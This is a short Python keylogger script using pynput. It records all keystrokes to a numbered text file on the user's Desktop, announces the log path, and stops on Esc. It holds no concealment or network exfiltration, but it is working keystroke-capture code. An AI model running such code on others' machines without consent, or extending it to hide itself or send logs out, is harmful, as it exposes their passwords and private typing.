import pynput
from pynput.keyboard import Key, Listener
import os

def get_desktop_directory():
   
    # Returns the path to the Desktop directory for the current user.
    
    return os.path.join(os.path.expanduser("~"), "Desktop")

def get_next_log_file(directory): # Finds the next available filename for the keylog file in the specified directory.
    
    i = 1
    while os.path.exists(os.path.join(directory, f"keylog{i}.txt")):
        i += 1
    return os.path.join(directory, f"keylog{i}.txt")

def on_press(key): # Callback function to handle key press events.
    
    try:
        log_file.write(f"{key.char}")
    except AttributeError:
        if key == Key.space:
            log_file.write(" ")
        elif key == Key.enter:
            log_file.write("\n")
        else:
            log_file.write(f" [{key}] ")

def on_release(key): # Callback function to handle key release events.
    
    if key == Key.esc:
        # Stop listener
        return False

if __name__ == "__main__":
    # Get the Desktop directory
    desktop_directory = get_desktop_directory()

    # Get the next available log file name
    log_file_path = get_next_log_file(desktop_directory)

    # Open the log file
    with open(log_file_path, "w") as log_file:
        # Inform the user about the log file
        print(f"Logging keystrokes to: {log_file_path}")

        # Start listening to keystrokes
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
